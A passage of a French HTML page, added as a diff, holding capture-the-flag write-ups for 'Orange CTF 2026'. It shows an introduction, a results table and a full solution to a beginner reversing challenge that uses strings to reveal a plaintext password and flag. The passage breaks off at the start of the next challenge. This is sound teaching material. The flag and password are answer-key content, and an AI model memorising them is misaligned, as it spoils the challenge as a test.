@@ -1,0 +1,1503 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>Orange CTF 2026 : Write-ups</title>
+<meta name="description" content="Write-ups complets de l'Orange CTF 2026 : Reversing, Network/Forensics, Web. Par SPECTRA MZ.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+:root{
+--bg:#080c18;--surface:#0f1525;--surface2:#151d30;--border:#1e2a42;
+--cyan:#00d4aa;--cyan-dim:#00d4aa22;--cyan-glow:#00d4aa44;
+--red:#ff4757;--amber:#ffa502;--purple:#a855f7;--blue:#2f9bff;--green:#4ade80;
+--text:#e2e8f4;--muted:#6b7a99;--code-bg:#060a14;
+--safe-t:env(safe-area-inset-top,0px);--safe-b:env(safe-area-inset-bottom,0px);
+--safe-l:env(safe-area-inset-left,0px);--safe-r:env(safe-area-inset-right,0px);
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%;text-size-adjust:100%}
+body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;font-size:16px;line-height:1.7;overflow-x:hidden;-webkit-font-smoothing:antialiased}
+body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.08) 2px,rgba(0,0,0,.08) 4px);pointer-events:none;z-index:9999}
+img{max-width:100%;height:auto;display:block}
+.progress-bar{position:fixed;top:0;left:0;right:0;height:3px;z-index:700;background:var(--border)}
+.progress-fill{height:100%;width:0%;background:linear-gradient(90deg,var(--cyan),var(--blue));box-shadow:0 0 8px var(--cyan-glow);transition:width .1s linear}
+.back-home{position:fixed;top:calc(1.2rem + var(--safe-t));left:calc(1.2rem + var(--safe-l));z-index:600;display:inline-flex;align-items:center;gap:.5rem;padding:.6rem 1.05rem;min-height:44px;background:rgba(15,21,37,.9);-webkit-backdrop-filter:blur(10px);backdrop-filter:blur(10px);border:1px solid var(--border);border-radius:8px;font-family:'JetBrains Mono',monospace;font-size:.78rem;font-weight:500;color:var(--muted);text-decoration:none;transition:all .2s}
+.back-home:hover,.back-home:active{border-color:var(--cyan);color:var(--cyan);box-shadow:0 0 16px var(--cyan-glow)}
+.back-home svg{width:14px;height:14px;flex-shrink:0}
+.sidebar{position:fixed;left:0;top:0;width:64px;height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:100;padding:1rem 0}
+.sidebar-line{width:1px;flex:1;background:var(--border)}
+.phase-dot{width:30px;height:30px;border-radius:50%;border:1px solid var(--border);background:var(--surface);display:flex;align-items:center;justify-content:center;font-family:'JetBrains Mono',monospace;font-size:9px;color:var(--muted);cursor:pointer;transition:all .3s;text-decoration:none;flex-shrink:0}
+.phase-dot:hover,.phase-dot.active{border-color:var(--cyan);color:var(--cyan);box-shadow:0 0 12px var(--cyan-glow);background:var(--cyan-dim)}
+.mobile-nav{display:none;position:fixed;bottom:0;left:0;right:0;z-index:650;background:rgba(15,21,37,.95);-webkit-backdrop-filter:blur(14px);backdrop-filter:blur(14px);border-top:1px solid var(--border);padding:.6rem calc(.6rem + var(--safe-l)) calc(.6rem + var(--safe-b)) calc(.6rem + var(--safe-r))}
+.mobile-nav-scroll{display:flex;gap:.5rem;overflow-x:auto;scrollbar-width:none;-ms-overflow-style:none}
+.mobile-nav-scroll::-webkit-scrollbar{display:none}
+.mobile-nav-item{flex-shrink:0;display:flex;align-items:center;justify-content:center;min-width:44px;min-height:44px;border-radius:8px;border:1px solid var(--border);background:var(--surface);font-family:'JetBrains Mono',monospace;font-size:.66rem;color:var(--muted);text-decoration:none;transition:all .2s}
+.mobile-nav-item.active{border-color:var(--cyan);color:var(--cyan);background:var(--cyan-dim)}
+main{margin-left:64px;width:calc(100% - 64px);padding:0 2rem 6rem}
+.inner{max-width:920px;margin:0 auto}
+.hero{padding:5.5rem 0 4rem;position:relative}
+.hero-eyebrow{font-family:'JetBrains Mono',monospace;font-size:11px;letter-spacing:.18em;text-transform:uppercase;color:var(--cyan);margin-bottom:1.5rem;display:flex;align-items:center;gap:.75rem;flex-wrap:wrap}
+.hero-eyebrow::before{content:'';display:inline-block;width:24px;height:1px;background:var(--cyan)}
+.hero-title{font-family:'JetBrains Mono',monospace;font-size:clamp(1.9rem,5.4vw,3.3rem);font-weight:700;line-height:1.15;letter-spacing:-.02em;margin-bottom:1rem;word-break:break-word}
+.hero-title .accent{color:var(--cyan)}
+.hero-title .dim{color:var(--muted);font-weight:300}
+.hero-sub{font-size:clamp(.95rem,2.2vw,1.05rem);color:var(--muted);margin-bottom:2rem;max-width:680px}
+.hero-meta{display:flex;flex-wrap:wrap;gap:1rem;margin-bottom:2rem;font-family:'JetBrains Mono',monospace;font-size:.78rem;color:var(--muted)}
+.hero-meta strong{color:var(--cyan)}
+.meta-pills{display:flex;flex-wrap:wrap;gap:.6rem;margin-bottom:2rem}
+.pill{padding:.35rem .9rem;border-radius:99px;font-family:'JetBrains Mono',monospace;font-size:11px;letter-spacing:.08em;font-weight:500;white-space:nowrap}
+.pill-cyan{border:1px solid var(--cyan);color:var(--cyan);background:var(--cyan-dim)}
+.pill-red{border:1px solid var(--red);color:var(--red);background:#ff475711}
+.pill-amber{border:1px solid var(--amber);color:var(--amber);background:#ffa50211}
+.pill-purple{border:1px solid var(--purple);color:var(--purple);background:#a855f711}
+.pill-green{border:1px solid var(--green);color:var(--green);background:#4ade8011}
+.pill-blue{border:1px solid var(--blue);color:var(--blue);background:#2f9bff11}
+.hero-divider{width:100%;height:1px;background:linear-gradient(90deg,var(--cyan) 0%,var(--border) 60%,transparent 100%);margin-top:3rem}
+.toc{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:1.5rem 1.6rem;margin:2rem 0}
+.toc-title{font-family:'JetBrains Mono',monospace;font-size:.75rem;letter-spacing:.15em;text-transform:uppercase;color:var(--cyan);margin-bottom:1rem}
+.toc-category{font-family:'JetBrains Mono',monospace;font-size:.7rem;letter-spacing:.14em;text-transform:uppercase;color:var(--muted);margin:1.2rem 0 .6rem;padding-bottom:.4rem;border-bottom:1px solid var(--border)}
+.toc-category:first-of-type{margin-top:0}
+.toc-list{list-style:none;display:grid;grid-template-columns:1fr 1fr;gap:.6rem 1.5rem}
+.toc-list a{font-size:.85rem;color:#b8c3d9;text-decoration:none;display:flex;align-items:baseline;gap:.5rem;transition:color .2s;min-height:24px}
+.toc-list a:hover,.toc-list a:active{color:var(--cyan)}
+.toc-num{font-family:'JetBrains Mono',monospace;font-size:.7rem;color:var(--muted);flex-shrink:0}
+.section{padding:3.5rem 0 2rem;border-bottom:1px solid var(--border)}
+.section:last-of-type{border-bottom:none}
+.section-label{font-family:'JetBrains Mono',monospace;font-size:10px;letter-spacing:.2em;text-transform:uppercase;color:var(--cyan);margin-bottom:.6rem;display:flex;align-items:center;gap:.5rem;flex-wrap:wrap}
+.section-label span{color:var(--muted)}
+.section-title{font-family:'JetBrains Mono',monospace;font-size:clamp(1.2rem,3.2vw,1.5rem);font-weight:600;color:var(--text);margin-bottom:.6rem;line-height:1.3;word-break:break-word}
+.section-points{font-family:'JetBrains Mono',monospace;font-size:.78rem;color:var(--muted);margin-bottom:1.5rem}
+.subsection-title{font-family:'JetBrains Mono',monospace;font-size:1rem;font-weight:600;color:var(--cyan);margin:2.2rem 0 .9rem;padding-left:1rem;border-left:2px solid var(--cyan)}
+p{margin-bottom:1.1rem;color:#b8c3d9;word-wrap:break-word}
+p strong{color:var(--text);font-weight:600}
+p em{color:#c8d3e8;font-style:italic}
+ul.plain,ol.plain{margin:0 0 1.1rem 1.3rem;color:#b8c3d9}
+ul.plain li,ol.plain li{margin-bottom:.5rem}
+code{background:var(--surface2);border:1px solid var(--border);border-radius:4px;padding:.1em .4em;color:#c0cce8;font-size:.85em;word-break:break-all;font-family:'JetBrains Mono',monospace}
+ul.rec-list{list-style:none;margin:1rem 0 1.5rem 0;padding:0;display:grid;gap:.7rem}
+ul.rec-list li{display:flex;align-items:flex-start;gap:1rem;background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:1rem 1.2rem;color:#b8c3d9;font-size:.9rem}
+ul.rec-list li strong{color:var(--text);display:block;margin-bottom:.15rem}
+.rec-num{font-family:'JetBrains Mono',monospace;font-size:.72rem;font-weight:700;color:var(--bg);background:var(--cyan);min-width:26px;height:26px;border-radius:6px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.def-box{background:linear-gradient(135deg,#2f9bff0a 0%,#2f9bff03 100%);border:1px solid var(--blue);border-radius:10px;padding:1.3rem 1.4rem;margin:1.2rem 0 1.6rem}
+.def-term{display:flex;align-items:center;gap:.6rem;font-family:'JetBrains Mono',monospace;font-size:.92rem;font-weight:700;color:var(--blue);margin-bottom:.5rem;flex-wrap:wrap}
+.def-term::before{content:'§';font-size:1.1rem}
+.def-body{color:#b8c3d9;font-size:.88rem}
+.glossary-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:1rem;margin:1.5rem 0}
+.glossary-card{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:1.2rem}
+.glossary-term{font-family:'JetBrains Mono',monospace;font-size:.85rem;font-weight:700;color:var(--cyan);margin-bottom:.5rem}
+.glossary-def{font-size:.82rem;color:var(--muted);line-height:1.55}
+.terminal-frame{background:var(--surface);border:1px solid var(--border);border-radius:10px;overflow:hidden;margin:1.5rem 0;box-shadow:0 8px 40px rgba(0,0,0,.5),0 0 0 1px rgba(0,212,170,.06)}
+.terminal-bar{background:var(--surface2);padding:.6rem .9rem;display:flex;align-items:center;gap:.5rem;border-bottom:1px solid var(--border);flex-wrap:wrap}
+.t-dot{width:10px;height:10px;border-radius:50%;flex-shrink:0}
+.t-dot-red{background:#ff5f57}.t-dot-amber{background:#ffbd2e}.t-dot-green{background:#28c840}
+.terminal-bar-label{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--muted);margin-left:.3rem;word-break:break-all}
+.terminal-frame .img-scroll{overflow-x:auto;-webkit-overflow-scrolling:touch}
+.terminal-frame img{width:100%;display:block;vertical-align:top}
+.terminal-caption{padding:.6rem .9rem;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--muted);background:var(--surface2);border-top:1px solid var(--border);display:flex;align-items:flex-start;gap:.5rem}
+.terminal-caption::before{content:'▸';color:var(--cyan);flex-shrink:0}
+.code-wrap{background:var(--code-bg);border:1px solid var(--border);border-radius:8px;overflow:hidden;margin:1rem 0 1.5rem;position:relative}
+.code-header{background:var(--surface2);padding:.45rem .9rem;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid var(--border);gap:.5rem}
+.code-lang{font-family:'JetBrains Mono',monospace;font-size:10px;letter-spacing:.1em;text-transform:uppercase;color:var(--cyan);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.copy-btn{background:none;border:1px solid var(--border);color:var(--muted);font-family:'JetBrains Mono',monospace;font-size:10px;padding:.35rem .7rem;border-radius:4px;cursor:pointer;transition:all .2s;min-height:32px;flex-shrink:0}
+.copy-btn:hover,.copy-btn:active{border-color:var(--cyan);color:var(--cyan)}
+.code-wrap pre{padding:1.1rem 1.1rem;overflow-x:auto;-webkit-overflow-scrolling:touch;font-family:'JetBrains Mono',monospace;font-size:.78rem;line-height:1.7;color:#c0cce8;white-space:pre;min-width:100%}
+.result-badge{display:inline-flex;align-items:flex-start;gap:.5rem;background:#00d4aa0f;border:1px solid var(--cyan);border-radius:6px;padding:.6rem 1rem;font-family:'JetBrains Mono',monospace;font-size:.8rem;color:var(--cyan);margin:.5rem 0 1rem;word-break:break-word}
+.result-badge::before{content:'✓';font-weight:700;flex-shrink:0}
+.warn-badge{display:inline-flex;align-items:flex-start;gap:.5rem;background:#ffa5020f;border:1px solid var(--amber);border-radius:6px;padding:.6rem 1rem;font-family:'JetBrains Mono',monospace;font-size:.8rem;color:var(--amber);margin:.5rem 0 1rem;word-break:break-word}
+.warn-badge::before{content:'⚠';font-weight:700;flex-shrink:0}
+.danger-badge{display:inline-flex;align-items:flex-start;gap:.5rem;background:#ff47570f;border:1px solid var(--red);border-radius:6px;padding:.6rem 1rem;font-family:'JetBrains Mono',monospace;font-size:.8rem;color:var(--red);margin:.5rem 0 1rem;word-break:break-word}
+.danger-badge::before{content:'✗';font-weight:700;flex-shrink:0}
+.flag-box{background:linear-gradient(135deg,#00d4aa0a 0%,#00d4aa03 100%);border:1px solid var(--cyan);border-radius:10px;padding:1.6rem 1.4rem;text-align:center;position:relative;overflow:hidden;margin:1.5rem 0}
+.flag-box::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse at 50% 0%,var(--cyan-glow) 0%,transparent 70%);pointer-events:none}
+.flag-label{font-family:'JetBrains Mono',monospace;font-size:10px;letter-spacing:.2em;text-transform:uppercase;color:var(--muted);margin-bottom:.8rem}
+.flag-text{font-family:'JetBrains Mono',monospace;font-size:clamp(.9rem,3.2vw,1.2rem);font-weight:700;color:var(--cyan);letter-spacing:.02em;text-shadow:0 0 20px var(--cyan-glow);word-break:break-all;position:relative}
+.chain{display:flex;flex-wrap:wrap;align-items:center;gap:.5rem;background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:1.1rem 1.2rem;margin:1.2rem 0 1.6rem}
+.chain-title{width:100%;font-family:'JetBrains Mono',monospace;font-size:.68rem;letter-spacing:.12em;text-transform:uppercase;color:var(--muted);margin-bottom:.7rem}
+.chain-node{font-family:'JetBrains Mono',monospace;font-size:.74rem;color:var(--text);background:var(--surface2);border:1px solid var(--border);border-radius:5px;padding:.35rem .65rem;word-break:break-word}
+.chain-arrow{font-family:'JetBrains Mono',monospace;font-size:.9rem;color:var(--cyan);flex-shrink:0}
+.chain-node.highlight{border-color:var(--cyan);color:var(--cyan);background:var(--cyan-dim)}
+.chain-node.danger{border-color:var(--red);color:var(--red);background:#ff475711}
+.table-wrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:1rem 0 1.5rem;border:1px solid var(--border);border-radius:8px}
+table{width:100%;border-collapse:collapse;font-size:.82rem;min-width:480px}
+table th,table td{padding:.7rem .9rem;text-align:left;border-bottom:1px solid var(--border);color:#b8c3d9}
+table th{background:var(--surface2);font-family:'JetBrains Mono',monospace;font-size:.75rem;letter-spacing:.06em;text-transform:uppercase;color:var(--cyan);font-weight:600;white-space:nowrap}
+table tr:last-child td{border-bottom:none}
+table tr:hover td{background:#0f152580}
+table code{font-size:.8em}
+.status-badges{display:flex;flex-wrap:wrap;gap:.5rem;margin-bottom:1rem}
+footer{margin-top:4rem;padding:2rem 0;border-top:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:1rem}
+.footer-author{font-family:'JetBrains Mono',monospace;font-size:.78rem;color:var(--muted);line-height:1.8}
+.footer-badge{font-family:'JetBrains Mono',monospace;font-size:.72rem;color:var(--muted);display:flex;align-items:center;gap:.4rem}
+.footer-badge span{color:var(--cyan)}
+.bottom-back{display:inline-flex;align-items:center;gap:.5rem;padding:.7rem 1.2rem;margin-top:.8rem;min-height:44px;border:1px solid var(--cyan);border-radius:8px;color:var(--cyan);text-decoration:none;font-family:'JetBrains Mono',monospace;font-size:.8rem;background:var(--cyan-dim);transition:all .2s}
+.bottom-back:hover,.bottom-back:active{box-shadow:0 0 20px var(--cyan-glow)}
+::-webkit-scrollbar{width:6px;height:6px}
+::-webkit-scrollbar-track{background:var(--bg)}
+::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
+::-webkit-scrollbar-thumb:hover{background:var(--muted)}
+
+@media (max-width:900px){
+main{margin-left:0;width:100%;padding:0 1.6rem 6rem}
+.sidebar{display:none}
+.mobile-nav{display:block}
+}
+@media (max-width:768px){
+.hero{padding:4.5rem 0 3rem}
+.toc-list{grid-template-columns:1fr}
+.glossary-grid{grid-template-columns:1fr}
+}
+@media (max-width:480px){
+body{font-size:15px}
+main{padding:0 1.1rem 6rem}
+.hero{padding:4rem 0 2.5rem}
+.back-home{font-size:.72rem;padding:.5rem .8rem}
+.back-home span.label{display:none}
+.section{padding:2.6rem 0 1.5rem}
+.section-title{margin-bottom:1.1rem}
+.subsection-title{margin:1.8rem 0 .7rem;font-size:.92rem}
+.terminal-bar-label{font-size:10px}
+.code-wrap pre{font-size:.7rem;padding:.9rem .8rem}
+.def-box,.toc,.terminal-caption{padding:1rem 1.1rem}
+.flag-box{padding:1.3rem 1rem}
+footer{flex-direction:column;align-items:flex-start}
+table{font-size:.75rem}
+table th,table td{padding:.55rem .7rem}
+}
+@media (max-height:480px) and (orientation:landscape){
+.mobile-nav{padding-bottom:calc(.4rem + var(--safe-b))}
+.mobile-nav-item{min-height:36px}
+}
+@media (min-width:1400px){.inner{max-width:1020px}}
+</style>
+</head>
+<body>
+
+<div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+
+<a class="back-home" href="../index.html">
+<svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M9.5 3L4.5 8L9.5 13"/></svg>
+<span class="label">Retour à l'accueil</span>
+</a>
+
+<nav class="sidebar">
+<div class="sidebar-line"></div>
+<a class="phase-dot" href="#s0">00</a>
+<div class="sidebar-line"></div>
+<a class="phase-dot" href="#s1">01</a>
+<div class="sidebar-line"></div>
+<a class="phase-dot" href="#s2">02</a>
+<div class="sidebar-line"></div>
+<a class="phase-dot" href="#s3">03</a>
+<div class="sidebar-line"></div>
+<a class="phase-dot" href="#s4">04</a>
+<div class="sidebar-line"></div>
+<a class="phase-dot" href="#s5">05</a>
+<div class="sidebar-line"></div>
+<a class="phase-dot" href="#s6">06</a>
+<div class="sidebar-line"></div>
+<a class="phase-dot" href="#s7">07</a>
+<div class="sidebar-line"></div>
+<a class="phase-dot" href="#s8">08</a>
+<div class="sidebar-line"></div>
+</nav>
+
+<nav class="mobile-nav">
+<div class="mobile-nav-scroll">
+<a class="mobile-nav-item" href="#s0">00</a>
+<a class="mobile-nav-item" href="#s1">01</a>
+<a class="mobile-nav-item" href="#s2">02</a>
+<a class="mobile-nav-item" href="#s3">03</a>
+<a class="mobile-nav-item" href="#s4">04</a>
+<a class="mobile-nav-item" href="#s5">05</a>
+<a class="mobile-nav-item" href="#s6">06</a>
+<a class="mobile-nav-item" href="#s7">07</a>
+<a class="mobile-nav-item" href="#s8">08</a>
+</div>
+</nav>
+
+<main>
+<div class="inner">
+
+<header class="hero">
+<div class="hero-eyebrow">Capture The Flag · Write-ups</div>
+<h1 class="hero-title">
+<span class="accent">Orange CTF 2026</span><br>
+<span class="dim">Reversing · Network/Forensics · Web</span>
+</h1>
+<p class="hero-sub">
+Retour complet sur ma participation à l'Orange CTF 2026. Huit défis documentés, dont six résolus et deux restés ouverts, avec la méthode utilisée, les erreurs commises et les enseignements tirés.
+</p>
+<div class="hero-meta">
+<span>Rédigé par <strong>SPECTRA MZ</strong></span>
+<span>·</span>
+<span>mer. 14 oct. 2026 21:24:02 WAT</span>
+</div>
+<div class="meta-pills">
+<span class="pill pill-cyan">Orange CTF</span>
+<span class="pill pill-purple">Reversing</span>
+<span class="pill pill-blue">Network</span>
+<span class="pill pill-amber">Forensics</span>
+<span class="pill pill-red">Web / API</span>
+<span class="pill pill-green">8 défis</span>
+</div>
+<div class="hero-divider"></div>
+</header>
+
+<div class="toc">
+<div class="toc-title">Sommaire</div>
+
+<div class="toc-category">// Vue d'ensemble</div>
+<ul class="toc-list">
+<li><span class="toc-num">00</span><a href="#s0">Introduction &amp; bilan</a></li>
+</ul>
+
+<div class="toc-category">// Reversing</div>
+<ul class="toc-list">
+<li><span class="toc-num">01</span><a href="#s1">Reversing Easy (50 pts)</a></li>
+<li><span class="toc-num">02</span><a href="#s2">Reversing &amp; Crypto (150 pts)</a></li>
+<li><span class="toc-num">03</span><a href="#s3">Brend new String Easy (10 pts)</a></li>
+</ul>
+
+<div class="toc-category">// Network / Forensics</div>
+<ul class="toc-list">
+<li><span class="toc-num">04</span><a href="#s4">SSH vs Telnet (10 pts)</a></li>
+<li><span class="toc-num">05</span><a href="#s5">C2 Server (100 pts)</a></li>
+<li><span class="toc-num">06</span><a href="#s6">Beacon (150 pts)</a></li>
+</ul>
+
+<div class="toc-category">// Web</div>
+<ul class="toc-list">
+<li><span class="toc-num">07</span><a href="#s7">MiWa (150 pts)</a></li>
+<li><span class="toc-num">08</span><a href="#s8">Web Security Expert (200 pts)</a></li>
+</ul>
+</div>
+
+<!-- ═══════════════════════════ SECTION 00 ═══════════════════════════ -->
+<section class="section" id="s0">
+<div class="section-label">Phase <span>00</span></div>
+<h2 class="section-title">Introduction &amp; bilan</h2>
+<p>
+L'Orange CTF 2026 proposait un panel de défis variés répartis sur plusieurs catégories : <strong>Reversing</strong>, <strong>Network / Forensics</strong> et <strong>Web / API</strong>. Ce document regroupe l'intégralité de mes write-ups, organisés par catégorie, avec pour chaque défi la démarche, les outils employés, les difficultés rencontrées et, lorsque c'est pertinent, les erreurs commises.
+</p>
+<p>
+Je documente aussi bien les défis résolus que ceux restés ouverts. L'objectif n'est pas seulement de présenter une solution propre, mais de partager le cheminement réel, y compris les fausses pistes et les moments de doute, parce que c'est souvent là que se trouve la vraie valeur pédagogique.
+</p>
+
+<div class="def-box">
+<div class="def-term">Bilan de participation</div>
+<div class="def-body">
+<strong>8 défis</strong> documentés · <strong>6 résolus</strong> · <strong>2 non résolus</strong> · <strong>1 statut incertain</strong>.<br>
+Catégories couvertes : Reversing (3), Network/Forensics (3), Web (2).
+</div>
+</div>
+
+<div class="table-wrap">
+<table>
+<thead>
+<tr><th>Défi</th><th>Catégorie</th><th>Points</th><th>Statut</th></tr>
+</thead>
+<tbody>
+<tr><td>Reversing Easy</td><td>Reversing</td><td>50</td><td>✅ Résolu</td></tr>
+<tr><td>Reversing &amp; Crypto</td><td>Reversing / Crypto</td><td>150</td><td>✅ Résolu</td></tr>
+<tr><td>Brend new String Easy</td><td>Reversing</td><td>10</td><td>⚠️ Non confirmé</td></tr>
+<tr><td>SSH vs Telnet</td><td>Network</td><td>10</td><td>❌ Non résolu</td></tr>
+<tr><td>C2 Server</td><td>Forensics</td><td>100</td><td>✅ Résolu</td></tr>
+<tr><td>Beacon</td><td>Forensics</td><td>150</td><td>❌ Non résolu</td></tr>
+<tr><td>MiWa</td><td>Web / API</td><td>150</td><td>✅ Résolu</td></tr>
+<tr><td>Web Security Expert</td><td>Web / API</td><td>200</td><td>✅ Résolu</td></tr>
+</tbody>
+</table>
+</div>
+</section>
+
+<!-- ═══════════════════════════ SECTION 01 ═══════════════════════════ -->
+<section class="section" id="s1">
+<div class="section-label">Reversing <span>· 50 pts</span></div>
+<h2 class="section-title">Reversing Easy</h2>
+<div class="status-badges">
+<span class="pill pill-green">✅ Résolu</span>
+<span class="pill pill-purple">Reversing</span>
+<span class="pill pill-cyan">strings</span>
+</div>
+<p>
+On me donne un binaire ELF <code>01_strings_easy</code>, strippé. Objectif : trouver le mot de passe embarqué dans le binaire et afficher le flag.
+</p>
+
+<h3 class="subsection-title">1. Première approche : reconnaissance</h3>
+<p>Avant de désassembler quoi que ce soit, je regarde toujours ce que je manipule :</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>file 01_strings_easy</pre>
+</div>
+<p>
+Résultat : un <strong>ELF 64 bits</strong>, dynamiquement lié, <strong>strippé</strong>. « Strippé » veut dire que les noms de fonctions et de symboles ont été retirés du binaire, donc pas de nom de fonction du genre <code>check_password()</code> qui apparaîtrait tout seul dans un désassembleur. Ça m'a mis en mode « il va falloir chercher à la main ».
+</p>
+
+<h3 class="subsection-title">2. Erreur n°1 : vouloir lancer le binaire trop vite</h3>
+<p>Réflexe classique : essayer de l'exécuter direct.</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>./01_strings_easy
+bash: ./01_strings_easy: Permission non accordée</pre>
+</div>
+<p>J'avais oublié de lui donner les droits d'exécution. Petite erreur bête mais fréquente :</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>chmod +x 01_strings_easy
+./01_strings_easy</pre>
+</div>
+<p>
+Ça m'a demandé un mot de passe (<code>Enter password: </code>). Sauf que je ne le connaissais pas encore, donc taper n'importe quoi ne servait à rien à ce stade, il fallait d'abord aller le chercher dans le binaire.
+</p>
+
+<h3 class="subsection-title">3. La bonne méthode : chercher dans les chaînes de caractères</h3>
+<p>Pour un binaire « strings easy », la première chose à tester, c'est littéralement la commande <code>strings</code> :</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>strings -a -t x 01_strings_easy</pre>
+</div>
+<p>
+Le <code>-t x</code> affiche l'offset en hexadécimal de chaque chaîne trouvée, ce qui est utile pour la retrouver ensuite dans <code>.rodata</code>. Dans la sortie, deux lignes sautent aux yeux :
+</p>
+<div class="terminal-frame">
+<div class="terminal-bar">
+<div class="t-dot t-dot-red"></div>
+<div class="t-dot t-dot-amber"></div>
+<div class="t-dot t-dot-green"></div>
+<span class="terminal-bar-label">Extrait de strings</span>
+</div>
+<div class="img-scroll"><pre style="padding:0.9rem 1rem;font-size:0.75rem;line-height:1.7;background:var(--code-bg);color:#c0cce8;margin:0;overflow-x:auto;">2020 Correct! FLAG{simple_password_crack}
+2050 open_sesame_2025</pre></div>
+<div class="terminal-caption">Mot de passe + flag en clair dans .rodata.</div>
+</div>
+<p>
+Le mot de passe (<code>open_sesame_2025</code>) et le flag (<code>FLAG{simple_password_crack}</code>) étaient tous les deux stockés en clair dans la section <code>.rodata</code>. Pas de chiffrement, pas d'obfuscation : un strippage du binaire ne protège que les symboles, pas les chaînes littérales. C'est exactement le piège pédagogique du challenge : il suffit de lire les strings, pas besoin de reverse le code.
+</p>
+
+<h3 class="subsection-title">4. Vérification : confirmer avant de soumettre</h3>
+<p>Je n'aime pas soumettre un flag « probable » sans l'avoir vérifié. J'ai donc rejoué le mot de passe trouvé :</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>echo "open_sesame_2025" | ./01_strings_easy</pre>
+</div>
+<p>Résultat :</p>
+<div class="result-badge">Enter password: Correct! FLAG{simple_password_crack}</div>
+<p>
+Le binaire confirme lui-même que c'est le bon mot de passe, et il affiche le flag. À ce stade, j'étais sûr à 100 % de la réponse.
+</p>
+
+<h3 class="subsection-title">5. Erreur n°2 : la vraie difficulté n'était pas technique</h3>
+<p>
+J'ai soumis <code>FLAG{simple_password_crack}</code> sur CTFd… et la plateforme a répondu <strong>Incorrect</strong>. C'est là que l'enquête a changé de nature : ce n'était plus un problème de reverse, mais un doute sur le format attendu par CTFd. Est-ce que le flag devait être soumis brut, avec un autre préfixe que <code>FLAG{}</code>, ou est-ce que le mot de passe lui-même (<code>open_sesame_2025</code>) était la vraie réponse attendue, indépendamment du texte affiché par le binaire ?
+</p>
+<p>
+J'ai creusé plusieurs pistes en parallèle (regarder si d'autres défis déjà validés donnaient un indice de format, comparer les hash du fichier au cas où la plateforme servait une version différente de celle téléchargée) avant que le flag finisse par passer. Le vrai enseignement ici : dans un CTF, une fois que l'extraction technique est certaine, la variable qui reste, c'est le <strong>format exact attendu par la plateforme</strong> (majuscules, préfixe, avec ou sans accolades). Ça vaut le coup de le vérifier sur un défi déjà résolu avant de s'acharner à retester la partie technique.
+</p>
+
+<h3 class="subsection-title">Résumé</h3>
+<div class="table-wrap">
+<table>
+<thead><tr><th>Étape</th><th>Outil</th><th>Résultat</th></tr></thead>
+<tbody>
+<tr><td>Identifier le binaire</td><td><code>file</code></td><td>ELF 64 bits, strippé</td></tr>
+<tr><td>Donner les droits</td><td><code>chmod +x</code></td><td>exécutable</td></tr>
+<tr><td>Extraire les chaînes</td><td><code>strings -a -t x</code></td><td>mot de passe + flag en clair dans .rodata</td></tr>
+<tr><td>Vérifier</td><td>exécution directe avec le mot de passe</td><td>confirmation du flag</td></tr>
+</tbody>
+</table>
+</div>
+
+<div class="flag-box">
+<div class="flag-label">Flag final</div>
+<div class="flag-text">FLAG{simple_password_crack}</div>
+</div>
+<p style="text-align:center;font-family:'JetBrains Mono',monospace;font-size:.8rem;color:var(--muted);">
+Mot de passe trouvé : <code>open_sesame_2025</code>
+</p>
+</section>
+
+<!-- ═══════════════════════════ SECTION 02 ═══════════════════════════ -->
+<section class="section" id="s2">
+<div class="section-label">Reversing &amp; Crypto <span>· 150 pts</span></div>
+<h2 class="section-title">Reversing &amp; Crypto</h2>
+<div class="status-badges">
+<span class="pill pill-green">✅ Résolu</span>
+<span class="pill pill-purple">Reversing</span>
+<span class="pill pill-amber">XOR</span>
+</div>
+<p>
+Un binaire ELF <code>02_xor_obfusc</code> contient un tableau d'octets XORé par une clé d'un octet. Il faut l'extraire et le décoder pour obtenir le flag. L'indice donné par les organisateurs : « Extrais le tableau depuis .rodata, puis applique un XOR octet à octet ».
+</p>
+
+<h3 class="subsection-title">1. Reconnaissance</h3>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>file 02_xor_obfusc</pre>
+</div>
+<p>
